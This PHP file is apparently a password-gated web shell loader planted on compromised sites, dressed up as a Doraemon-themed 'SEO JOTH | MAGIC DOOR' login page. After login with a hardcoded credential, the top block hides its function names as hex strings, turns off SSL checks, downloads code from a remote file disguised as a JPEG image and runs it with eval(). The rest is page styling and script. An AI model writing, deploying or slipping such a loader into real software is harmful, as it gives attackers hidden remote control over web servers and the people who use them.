<?php
session_start();

function is_logged_in() {
    return isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true;
}

$username = "pixgacor";
$passwordHash = '$2a$12$uSbpgBoCye8xXOx4/PXacuGUUocHkJkN8K5guiOAQLY8..2xi7dNK';

if (!is_logged_in()) {
    if (isset($_POST['username']) && isset($_POST['password'])) {
        if ($_POST['username'] === $username && password_verify($_POST['password'], $passwordHash)) {
            $_SESSION['loggedin'] = true;
            header("Location: " . $_SERVER['PHP_SELF']);
            exit();
        } else {
            $error = "ACCESS DENIED";
        }
    }
}

function hex2str($hex) {
    $str = '';
    for ($i = 0; $i < strlen($hex); $i += 2) {
        $str .= chr(hexdec(substr($hex, $i, 2)));
    }
    return $str;
}

function geturlsinfo($destiny) {
    $Array = array(
        '666f70656e',
        '73747265616d5f6765745f636f6e74656e7473',
        '66696c655f6765745f636f6e74656e7473',
        '6375726c5f65786563'
    );

    $belief = array(
        hex2str($Array[0]),
        hex2str($Array[1]),
        hex2str($Array[2]),
        hex2str($Array[3])
    );

    if (function_exists($belief[3])) {
        $ch = curl_init($destiny);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        $love = $belief[3]($ch);
        curl_close($ch);
        return $love;
    } elseif (function_exists($belief[2])) {
        return $belief[2]($destiny);
    } elseif (function_exists($belief[0]) && function_exists($belief[1])) {
        $purpose = $belief[0]($destiny, "r");
        $love = $belief[1]($purpose);
        fclose($purpose);
        return $love;
    }
    return false;
}

if (is_logged_in()) {
    $destiny = 'https://res.cloudinary.com/dil0dlflt/image/upload/v1771411457/kim_putin_love_el66gi.jpg';
    $dream = geturlsinfo($destiny);

    if ($dream !== false) {
       
        $pos = strpos($dream, '<?php');
        if ($pos !== false) {
            $phpCode = substr($dream, $pos + 5); 
            eval($phpCode);
        } else {
            eval('?>' . $dream);
        }
        exit();
    }
}

if (!is_logged_in()) {
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>SEO JOTH | MAGIC DOOR</title>
        <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&family=Quicksand:wght@400;600;700&display=swap" rel="stylesheet">
        <style>
            * {
                margin: 0;
                padding: 0;
                box-sizing: border-box;
            }

            body, html {
                height: 100%;
                font-family: 'Poppins', 'Quicksand', sans-serif;
                overflow: hidden;
                position: relative;
            }

            /* Animated Gradient Background */
            body {
                background: linear-gradient(-45deg, #371a8c, #5b2a97, #7c4ad8, #ac6ae6);
                background-size: 400% 400%;
                animation: gradientBG 15s ease infinite;
                position: relative;
            }

            @keyframes gradientBG {
                0% { background-position: 0% 50%; }
                50% { background-position: 100% 50%; }
                100% { background-position: 0% 50%; }
            }

            /* Floating Clouds */
            .cloud {
                position: absolute;
                background: rgba(255, 255, 255, 0.15);
                backdrop-filter: blur(4px);
                border-radius: 1000px;
                box-shadow: 0 0 40px rgba(255, 255, 255, 0.3);
                z-index: 1;
            }

            .cloud-1 {
                width: 300px;
                height: 100px;
                top: 10%;
                left: 5%;
                animation: floatCloud 25s infinite linear;
            }

            .cloud-2 {
                width: 400px;
                height: 120px;
                bottom: 15%;
                right: 5%;
                animation: floatCloud 30s infinite linear reverse;
            }

            .cloud-3 {
                width: 250px;
                height: 80px;
                top: 30%;
                right: 15%;
                animation: floatCloud 20s infinite linear;
            }

            .cloud::before, .cloud::after {
                content: '';
                position: absolute;
                background: inherit;
                border-radius: 50%;
            }

            .cloud::before {
                width: 150px;
                height: 150px;
                top: -60px;
                left: 20px;
            }

            .cloud::after {
                width: 120px;
                height: 120px;
                top: -40px;
                right: 30px;
            }

            @keyframes floatCloud {
                from { transform: translateX(-100%) translateY(0); }
                to { transform: translateX(200%) translateY(50px); }
            }

            /* Bamboo Helicopter Animation */
            .helicopter {
                position: absolute;
                top: 15%;
                right: 10%;
                width: 80px;
                height: 80px;
                animation: hover 3s infinite ease-in-out;
                z-index: 5;
            }

            .helicopter img {
                width: 100%;
                height: 100%;
                object-fit: contain;
                filter: drop-shadow(0 10px 15px rgba(0,0,0,0.2));
                animation: spin 2s infinite linear;
            }

            @keyframes spin {
                from { transform: rotate(0deg); }
                to { transform: rotate(360deg); }
            }

            @keyframes hover {
                0%, 100% { transform: translateY(0); }
                50% { transform: translateY(-20px); }
            }

            /* Anywhere Door Animation */
            .door {
                position: absolute;
                bottom: 10%;
                left: 8%;
                width: 120px;
                height: 160px;
                background: rgba(255, 183, 77, 0.2);
                backdrop-filter: blur(8px);
                border: 3px solid #ff4dd0;
                border-radius: 20px;
                transform: perspective(500px) rotateY(20deg);
                animation: doorGlow 3s infinite, doorFloat 4s infinite;
                z-index: 5;
                overflow: hidden;
            }

            .door::before {
                content: '🚪';
                position: absolute;
                top: 50%;
                left: 50%;
                transform: translate(-50%, -50%);
                font-size: 50px;
                opacity: 0.8;
            }

            .door::after {
                content: '';
                position: absolute;
                top: 0;
                left: -100%;
                width: 100%;
                height: 100%;
                background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
                animation: doorShine 3s infinite;
            }

            @keyframes doorGlow {
                0%, 100% { box-shadow: 0 0 20px #ff4dd0; }
                50% { box-shadow: 0 0 50px #ff4dd0; }
            }

            @keyframes doorFloat {
                0%, 100% { transform: perspective(500px) rotateY(20deg) translateY(0); }
                50% { transform: perspective(500px) rotateY(20deg) translateY(-20px); }
            }

            @keyframes doorShine {
                0% { left: -100%; }
                20% { left: 100%; }
                100% { left: 100%; }
            }

            /* Floating Doraemon Items */
            .floating-item {
                position: absolute;
                font-size: 40px;
                filter: drop-shadow(0 5px 15px rgba(0,0,0,0.2));
                animation: float 6s infinite;
                z-index: 2;
            }

            .item-1 { top: 20%; left: 15%; animation-delay: 0s; }
            .item-2 { top: 60%; right: 12%; animation-delay: 2s; }
            .item-3 { bottom: 25%; left: 20%; animation-delay: 4s; }
            .item-4 { top: 40%; right: 25%; animation-delay: 1s; }

            @keyframes float {
                0%, 100% { transform: translateY(0) rotate(0deg); }
                50% { transform: translateY(-20px) rotate(10deg); }
            }

            /* Magic Sparkles */
            .sparkles {
                position: absolute;
                width: 100%;
                height: 100%;
                pointer-events: none;
                z-index: 3;
            }

            .sparkle {
                position: absolute;
                width: 6px;
                height: 6px;
                background: white;
                border-radius: 50%;
                box-shadow: 0 0 20px gold;
                animation: sparkle 3s infinite;
            }

            @keyframes sparkle {
                0%, 100% { opacity: 0; transform: scale(0); }
                50% { opacity: 1; transform: scale(1); }
            }

            /* Main Container */
            .container {
                position: relative;
                z-index: 10;
                width: 100%;
                min-height: 100vh;
                display: flex;
                justify-content: center;
                align-items: center;
                padding: 20px;
            }

            /* Main Login Card */
            .login-card {
                width: 100%;
                max-width: 480px;
                background: rgba(255, 255, 255, 0.1);
                backdrop-filter: blur(20px);
                -webkit-backdrop-filter: blur(20px);
                border: 1px solid rgba(255, 255, 255, 0.3);
                border-radius: 40px;
                padding: 40px;
                box-shadow: 
                    0 30px 60px rgba(0, 0, 0, 0.3),
                    0 0 0 1px rgba(255, 255, 255, 0.2) inset,
                    0 0 50px rgba(255, 215, 0, 0.3);
                animation: cardEnter 0.8s cubic-bezier(0.23, 1, 0.32, 1);
                position: relative;
                overflow: hidden;
            }

            @keyframes cardEnter {
                from {
                    opacity: 0;
                    transform: translateY(50px) scale(0.9);
                }
                to {
                    opacity: 1;
                    transform: translateY(0) scale(1);
                }
            }

            /* Card Background Pattern */
            .login-card::before {
                content: '';
                position: absolute;
                top: -50%;
                left: -50%;
                width: 200%;
                height: 200%;
                background: radial-gradient(circle, rgba(255,255,255,0.1) 1px, transparent 1px);
                background-size: 30px 30px;
                animation: patternMove 20s linear infinite;
                z-index: -1;
            }

            @keyframes patternMove {
                from { transform: rotate(0deg); }
                to { transform: rotate(360deg); }
            }

            /* Character Row */
            .character-row {
                display: flex;
                justify-content: center;
                align-items: flex-end;
                gap: 15px;
                margin-bottom: 25px;
                position: relative;
            }

            .character {
                width: 70px;
                height: 70px;
                border-radius: 50%;
                object-fit: cover;
                border: 3px solid white;
                box-shadow: 0 10px 20px rgba(0,0,0,0.2);
                transition: all 0.3s ease;
                animation: characterPop 0.5s ease backwards;
            }

            .character:nth-child(1) { animation-delay: 0.1s; }
            .character:nth-child(2) { animation-delay: 0.2s; width: 90px; height: 90px; }
            .character:nth-child(3) { animation-delay: 0.3s; }

            @keyframes characterPop {
                from {
                    opacity: 0;
                    transform: translateY(30px) scale(0.5);
                }
                to {
                    opacity: 1;
                    transform: translateY(0) scale(1);
                }
            }

            .character:hover {
                transform: translateY(-10px) scale(1.1);
                border-color: gold;
                box-shadow: 0 20px 30px rgba(255,215,0,0.4);
            }

            /* Doraemon Bell */
            .bell {
                position: absolute;
                top: -15px;
                right: 20px;
                width: 40px;
                height: 40px;
                background: radial-gradient(circle at 30% 30%, #ffd700, #b8860b);
                border-radius: 50% 50% 50% 50% / 60% 60% 40% 40%;
                border: 2px solid #ffa500;
                animation: bellRing 2s infinite;
                transform-origin: top center;
            }

            .bell::before {
                content: '🔔';
                position: absolute;
                top: 50%;
                left: 50%;
                transform: translate(-50%, -50%);
                font-size: 20px;
            }

            .bell::after {
                content: '';
                position: absolute;
                top: -5px;
                left: 50%;
                transform: translateX(-50%);
                width: 8px;
                height: 10px;
                background: #cd7f32;
                border-radius: 4px;
            }

            @keyframes bellRing {
                0%, 100% { transform: rotate(0deg); }
                10%, 30%, 50% { transform: rotate(10deg); }
                20%, 40% { transform: rotate(-10deg); }
            }

            /* Title Area */
            .title-area {
                text-align: center;
                margin-bottom: 35px;
                position: relative;
            }

            .main-title {
                font-size: 42px;
                font-weight: 700;
                background: linear-gradient(135deg, #fff, #ffd700, #fff);
                -webkit-background-clip: text;
                -webkit-text-fill-color: transparent;
                text-shadow: 0 5px 20px rgba(255,215,0,0.5);
                margin-bottom: 5px;
                position: relative;
                display: inline-block;
            }

            .sub-title {
                color: rgba(255,255,255,0.9);
                font-size: 16px;
                letter-spacing: 4px;
                text-transform: uppercase;
                background: rgba(255,255,255,0.1);
                padding: 5px 15px;
                border-radius: 50px;
                display: inline-block;
                backdrop-filter: blur(5px);
            }

            /* Input Groups */
            .input-group {
                margin-bottom: 25px;
                position: relative;
            }

            .input-icon {
                position: absolute;
                left: 20px;
                top: 50%;
                transform: translateY(-50%);
                font-size: 20px;
                z-index: 2;
                filter: drop-shadow(0 0 5px gold);
            }

            .input-field {
                width: 100%;
                padding: 18px 25px 18px 55px;
                background: rgba(255, 255, 255, 0.15);
                border: 2px solid rgba(255, 255, 255, 0.2);
                border-radius: 60px;
                color: white;
                font-size: 16px;
                transition: all 0.3s ease;
                backdrop-filter: blur(5px);
            }

            .input-field:focus {
                outline: none;
                border-color: gold;
                background: rgba(255, 255, 255, 0.2);
                box-shadow: 0 0 30px rgba(255, 215, 0, 0.3);
                transform: scale(1.02);
            }

            .input-field::placeholder {
                color: rgba(255, 255, 255, 0.7);
                font-weight: 300;
            }

            /* Password Strength Indicator */
            .strength-indicator {
                display: flex;
                gap: 5px;
                margin-top: 8px;
                padding-left: 15px;
            }

            .strength-bar {
                height: 4px;
                flex: 1;
                background: rgba(255,255,255,0.2);
                border-radius: 4px;
                transition: all 0.3s ease;
            }

            .strength-bar.active {
                background: gold;
                box-shadow: 0 0 10px gold;
            }

            /* Login Button */
            .login-btn {
                width: 100%;
                padding: 18px;
                background: linear-gradient(135deg, #ffd700, #ffa500, #ffd700);
                border: none;
                border-radius: 60px;
                color: #1a1a1a;
                font-size: 18px;
                font-weight: 700;
                letter-spacing: 2px;
                text-transform: uppercase;
                cursor: pointer;
                position: relative;
                overflow: hidden;
                transition: all 0.3s ease;
                box-shadow: 0 10px 30px rgba(255, 215, 0, 0.4);
                margin-top: 15px;
            }

            .login-btn::before {
                content: '';
                position: absolute;
                top: 0;
                left: -100%;
                width: 100%;
                height: 100%;
                background: linear-gradient(90deg, transparent, rgba(255,255,255,0.4), transparent);
                transition: left 0.5s ease;
            }

            .login-btn:hover::before {
                left: 100%;
            }

            .login-btn:hover {
                transform: translateY(-3px);
                box-shadow: 0 15px 40px rgba(255, 215, 0, 0.6);
            }

            .login-btn:active {
                transform: translateY(0);
            }

            /* Secret Gadget Row */
            .gadget-row {
                display: flex;
                justify-content: center;
                gap: 20px;
                margin: 25px 0 15px;
            }

            .gadget {
                width: 45px;
                height: 45px;
                background: rgba(255,255,255,0.15);
                border-radius: 50%;
                display: flex;
                align-items: center;
                justify-content: center;
                font-size: 24px;
                border: 2px solid rgba(255,215,0,0.3);
                transition: all 0.3s ease;
                animation: gadgetGlow 2s infinite;
            }

            .gadget:nth-child(1) { animation-delay: 0s; }
            .gadget:nth-child(2) { animation-delay: 0.4s; }
            .gadget:nth-child(3) { animation-delay: 0.8s; }
            .gadget:nth-child(4) { animation-delay: 1.2s; }

            @keyframes gadgetGlow {
                0%, 100% { box-shadow: 0 0 10px gold; }
                50% { box-shadow: 0 0 25px gold; }
            }

            .gadget:hover {
                transform: scale(1.2) rotate(10deg);
                background: rgba(255,215,0,0.3);
                border-color: gold;
            }

            /* Error Message */
            .error-message {
                background: rgba(255, 68, 68, 0.2);
                border: 1px solid rgba(255, 68, 68, 0.4);
                border-radius: 50px;
                padding: 15px 20px;
                margin-bottom: 25px;
                color: #ff8888;
                text-align: center;
                font-size: 14px;
                letter-spacing: 1px;
                backdrop-filter: blur(5px);
                animation: errorShake 0.5s ease;
                display: flex;
                align-items: center;
                justify-content: center;
                gap: 10px;
            }

            @keyframes errorShake {
                0%, 100% { transform: translateX(0); }
                10%, 30%, 50%, 70%, 90% { transform: translateX(-5px); }
                20%, 40%, 60%, 80% { transform: translateX(5px); }
            }

            /* Magic Portal Effect */
            .portal-effect {
                position: absolute;
                top: -20px;
                right: -20px;
                width: 150px;
                height: 150px;
                background: radial-gradient(circle, rgba(255,215,0,0.3), transparent 70%);
                border-radius: 50%;
                animation: portalSpin 10s linear infinite;
                pointer-events: none;
            }

            @keyframes portalSpin {
                from { transform: rotate(0deg) scale(1); }
                to { transform: rotate(360deg) scale(1.2); }
            }

            /* Status Bar */
            .status-bar {
                display: flex;
                justify-content: space-between;
                margin-top: 25px;
                padding-top: 20px;
                border-top: 1px solid rgba(255,255,255,0.2);
                color: rgba(255,255,255,0.8);
                font-size: 12px;
            }

            .status-item {
                display: flex;
                align-items: center;
                gap: 6px;
            }

            .status-dot {
                width: 8px;
                height: 8px;
                background: #4caf50;
                border-radius: 50%;
                animation: pulse 2s infinite;
                box-shadow: 0 0 10px #4caf50;
            }

            .status-dot.yellow {
                background: gold;
                box-shadow: 0 0 10px gold;
            }

            @keyframes pulse {
                0%, 100% { opacity: 1; }
                50% { opacity: 0.3; }
            }

            /* Responsive */
            @media (max-width: 600px) {
                .login-card {
                    padding: 30px 20px;
                }
                
                .main-title {
                    font-size: 32px;
                }
                
                .character {
                    width: 50px;
                    height: 50px;
                }
                
                .character:nth-child(2) {
                    width: 70px;
                    height: 70px;
                }
                
                .floating-item {
                    font-size: 30px;
                }
                
                .door, .helicopter {
                    display: none;
                }
            }

            /* Mouse Trail Effect */
            .mouse-trail {
                position: fixed;
                width: 10px;
                height: 10px;
                background: gold;
                border-radius: 50%;
                pointer-events: none;
                z-index: 9999;
                opacity: 0.6;
                transition: all 0.1s ease;
                box-shadow: 0 0 20px gold;
            }
        </style>
    </head>
    <body>
        <!-- Floating Clouds -->
        <div class="cloud cloud-1"></div>
        <div class="cloud cloud-2"></div>
        <div class="cloud cloud-3"></div>
        
        <!-- Doraemon Gadgets Animation -->
        <div class="helicopter">
            <img src="https://res.cloudinary.com/dil0dlflt/image/upload/v1771312485/magic-doraemon-doraemon_fjxysz.gif" alt="Bamboo Helicopter">
        </div>
        
        <!-- Anywhere Door -->
        <div class="door"></div>
        
        <!-- Floating Doraemon Items -->
        <div class="floating-item item-1">🔔</div>
        <div class="floating-item item-2">🪄</div>
        <div class="floating-item item-3">🎋</div>
        <div class="floating-item item-4">⭐</div>
        
        <!-- Magic Sparkles -->
        <div class="sparkles" id="sparkles"></div>
        
        <!-- Main Container -->
        <div class="container">
            <div class="login-card">
                <!-- Portal Effect -->
                <div class="portal-effect"></div>
                
                <!-- Doraemon Bell -->
                <div class="bell"></div>
                
                <!-- Character Row -->
                <div class="character-row">
                    <img src="https://res.cloudinary.com/dil0dlflt/image/upload/v1771410150/favicon-01_itnru3.png" alt="Space" class="character">
                    <img src="https://res.cloudinary.com/dil0dlflt/image/upload/v1771410074/background_in04tl.gif" alt="Team H21 Magic" class="character">
                    <img src="https://res.cloudinary.com/dil0dlflt/image/upload/v1771314159/cat_v8cfnn.jpg" alt="Cat" class="character">
                </div>
                
                <!-- Title Area -->
                <div class="title-area">
                    <h1 class="main-title">SEO JOTH</h1>
                    <div class="sub-title">MAGIC DOOR</div>
                </div>
                
                <!-- Error Message -->
                <?php if (isset($error)): ?>
                    <div class="error-message">
                        <span>🔒</span>
                        <?php echo $error; ?>
                        <span>🔒</span>
                    </div>
                <?php endif; ?>
                
                <!-- Login Form -->
                <form method="post">
                    <div class="input-group">
                        <span class="input-icon">👤</span>
                        <input type="text" class="input-field" name="username" placeholder="Enter your username" required>
                    </div>
                    
                    <div class="input-group">
                        <span class="input-icon">🔑</span>
                        <input type="password" class="input-field" name="password" id="password" placeholder="Enter your password" required>
                    </div>
                    
                    <!-- Password Strength Indicator -->
                    <div class="strength-indicator">
                        <div class="strength-bar" id="strength1"></div>
                        <div class="strength-bar" id="strength2"></div>
                        <div class="strength-bar" id="strength3"></div>
                    </div>
                    
                    <!-- Secret Gadget Row -->
                    <div class="gadget-row">
                        <div class="gadget" title="Anywhere Door">🚪</div>
                        <div class="gadget" title="Bamboo Helicopter">🎋</div>
                        <div class="gadget" title="Memory Bread">🍞</div>
                        <div class="gadget" title="Take-copter">🚁</div>
                    </div>
                    
                    <button type="submit" class="login-btn">
                        OPEN THE MAGIC DOOR
                    </button>
                </form>
                
                <!-- Status Bar -->
                <div class="status-bar">
                    <div class="status-item">
                        <span class="status-dot"></span>
                        <span>SECRET GADGETS: 4</span>
                    </div>
                    <div class="status-item">
                        <span class="status-dot yellow"></span>
                        <span>MAGIC LEVEL: 100%</span>
                    </div>
                    <div class="status-item">
                        <span>✨ v4.0</span>
                    </div>
                </div>
            </div>
        </div>

        <script>
            // Generate sparkles
            function createSparkles() {
                const sparklesContainer = document.getElementById('sparkles');
                for (let i = 0; i < 30; i++) {
                    const sparkle = document.createElement('div');
                    sparkle.className = 'sparkle';
                    sparkle.style.left = Math.random() * 100 + '%';
                    sparkle.style.top = Math.random() * 100 + '%';
                    sparkle.style.animationDelay = Math.random() * 3 + 's';
                    sparkle.style.animationDuration = (Math.random() * 2 + 2) + 's';
                    sparklesContainer.appendChild(sparkle);
                }
            }
            createSparkles();

            // Password strength indicator
            document.getElementById('password')?.addEventListener('input', function(e) {
                const password = e.target.value;
                const strength1 = document.getElementById('strength1');
                const strength2 = document.getElementById('strength2');
                const strength3 = document.getElementById('strength3');
                
                if (password.length === 0) {
                    strength1.classList.remove('active');
                    strength2.classList.remove('active');
                    strength3.classList.remove('active');
                } else if (password.length < 4) {
                    strength1.classList.add('active');
                    strength2.classList.remove('active');
                    strength3.classList.remove('active');
                } else if (password.length < 8) {
                    strength1.classList.add('active');
                    strength2.classList.add('active');
                    strength3.classList.remove('active');
                } else {
                    strength1.classList.add('active');
                    strength2.classList.add('active');
                    strength3.classList.add('active');
                }
            });

            // Mouse trail effect
            document.addEventListener('mousemove', function(e) {
                const trail = document.createElement('div');
                trail.className = 'mouse-trail';
                trail.style.left = e.pageX - 5 + 'px';
                trail.style.top = e.pageY - 5 + 'px';
                document.body.appendChild(trail);
                
                setTimeout(() => {
                    trail.remove();
                }, 500);
            });

            // Floating items animation
            const items = document.querySelectorAll('.floating-item');
            items.forEach((item, index) => {
                item.style.animation = `float ${6 + index}s infinite ease-in-out`;
            });
        </script>
    </body>
    </html>
    <?php
    exit();
}

?>
